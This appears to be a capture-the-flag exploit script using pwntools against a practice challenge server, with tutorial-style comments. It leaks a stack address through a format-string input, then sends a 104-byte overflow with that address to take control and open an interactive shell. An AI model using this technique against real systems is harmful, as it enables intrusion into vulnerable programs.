from pwn import *

#set the arch of the binary, this can be used internally by pwntools
context.arch = 'amd64'

#process or remote listener that we will communicate with
#p = process("printf_is_echo")
p = remote("ctf.ropcity.com", 31338)

#https://docs.pwntools.com/en/stable/shellcraft.html
#print("lets see some shellcode")
#print(pwnlib.shellcraft.amd64.linux.sh())
#print("lets see some shellcode ready to be written as bytes")
#print(asm(pwnlib.shellcraft.amd64.linux.sh()))

#send hello to a binary
p.recvuntil('try it!\n')
p.send(b'%16$p\n')
addr = p.recvline(timeout=5)[:-1]
addr = int(addr, 0)
payload = b'A' * 104 + p64(addr) + b'\n'
#print(p.recvall(timeout=5))

p.send(payload)

#p.send("hello")
#receive everything the binary has sent back to the buffer
#p.recv()
#receive 8 bytes
#p.recv(8)
p.interactive()
#pack an address to add it to a 64-bit payload
#p64(0xdeadbeef)
